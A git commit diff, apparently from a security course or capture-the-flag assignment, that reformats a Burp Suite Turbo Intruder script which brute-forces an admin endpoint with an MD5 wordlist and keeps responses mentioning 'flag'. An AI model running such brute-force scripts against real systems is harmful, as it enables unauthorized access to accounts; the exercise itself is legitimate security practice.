039ab42e7ffaabb7090675c88a5aba5c54d8d8d7
Vaernion <vaporz@gmail.com>
2021-09-03 02:09:23 +0200

    tweaks

--- assignment02/burp-bruteforce-admin.py
+++ assignment02/burp-bruteforce-admin.py
@@ -1,12 +1,16 @@
 def queueRequests(target, wordlists):
-    engine = RequestEngine(endpoint=target.endpoint,
-     concurrentConnections = 10,
-      requestsPerConnection=100, pipeline= False)
+    engine = RequestEngine(
+        endpoint=target.endpoint,
+        concurrentConnections=10,
+        requestsPerConnection=100,
+        pipeline=False,
+    )
 
-    for word in open('megalist_md5.txt'):
-        engine.queue(target.req,word)
+    for word in open("megalist_md5.txt"):
+        engine.queue(target.req, word)
+
 
 def handleResponse(req, interesting):
-    if "flag" in req.response.lower():
-    # if not "WrongAnswer" in req.response:
+    if interesting or "flag" in req.response.lower():
+        # if not "WrongAnswer" in req.response:
         table.add(req)
